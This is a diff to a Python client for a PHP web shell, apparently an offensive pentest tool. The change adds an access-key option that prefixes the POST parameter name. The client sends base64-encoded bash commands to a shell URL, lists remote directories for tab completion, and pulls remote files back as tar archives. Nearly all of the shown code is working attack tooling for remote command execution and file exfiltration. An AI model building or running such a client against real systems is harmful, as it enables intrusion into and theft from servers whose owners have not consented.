@@ -1,3 +1,4 @@
+import argparse
 import atexit
 import base64
 import os
@@ -11,12 +12,18 @@ from queue import Queue
 from threading import Thread
 from time import strftime
 
-if len(sys.argv) != 2:
-    print('\nUsage: python3 {} URL\n'.format(sys.argv[0]))
-    print('For example:\npython3 {} {}\n'.format(sys.argv[0], 'http://192.168.56.101/shell.php'))
-    exit(0)
-else:
-    url = sys.argv[1]
+parser = argparse.ArgumentParser(description='Shellify Your HTTP Command Injection!', epilog=('For example:\npython3 %s https://192.168.56.101/shell.php -k G4ur5Mhxmb7ZsWt/h+OMDhzTDuLKEbrvmBlD0yoVslQ' % sys.argv[0]))
+
+#parser._action_groups.pop()
+#required = parser.add_argument_group('required arguments')
+#optional = parser.add_argument_group('optional arguments')
+
+parser.add_argument('url', help='target URL')
+parser.add_argument('-k', '--key', dest="key", help='shell access key')
+args = parser.parse_args()
+
+url = args.url
+key = args.key
 
 downloads_directory = "downloads"
 
@@ -84,7 +91,7 @@ def tabCompleterThread():
 
 def populateTabComplete(path):
     global tab_complete;
-    entries = makeRequest(20, 'bash', '-c "cd {} && ls -p"'.format(path)).split("\n")[:-1]
+    entries = makeRequest(20, 'bash', '-c "cd {} && ls -p"'.format(path), key).split("\n")[:-1]
     if entries:
         tab_complete[path] = entries
 
@@ -96,6 +103,7 @@ t.start()
 def run():
     global timeout
     global url
+    global key
     global current_path
     q.put('/')
     while True:
@@ -123,7 +131,7 @@ def run():
             continue
         if parts[0] == 'get':
             path_to_download = os.path.abspath(os.path.join(current_path, parts[1])).strip()
-            tgz = makeRequest(timeout, 'tar', 'cz {}'.format(path_to_download), noDecode=True)
+            tgz = makeRequest(timeout, 'tar', 'cz {}'.format(path_to_download), key, noDecode=True)
             filename = path_to_download.replace('/', '_')+'.'+strftime("%Y%m%d%H%M%S")+'.tgz'
             if not os.path.exists(downloads_directory):
                 os.makedirs(downloads_directory)
@@ -140,13 +148,18 @@ def run():
         cmd = 'bash'
         opts = '-c "cd {} 2>&1 && {} 2>&1"'.format(current_path, inputstr.replace('"', '\\"'))
 
-        result = makeRequest(timeout, cmd, opts)
+        result = makeRequest(timeout, cmd, opts, key)
         print("{}{}".format(bcolors.ENDC, result))
 
-def makeRequest(timeout, cmd, opts, noDecode=False):
+def makeRequest(timeout, cmd, opts, key, noDecode=False):
+    if key is None:
+      post_cmd = 'cmd'
+    else:
+      post_cmd = key+'cmd'
+
     requestData = urllib.parse.urlencode({
         'timeout': timeout,
-        'cmd': base64.b64encode(cmd.encode('ascii')).decode(),
+        post_cmd: base64.b64encode(cmd.encode('ascii')).decode(),
         'opts': base64.b64encode(opts.encode('ascii')).decode()
     }).encode('ascii')
 
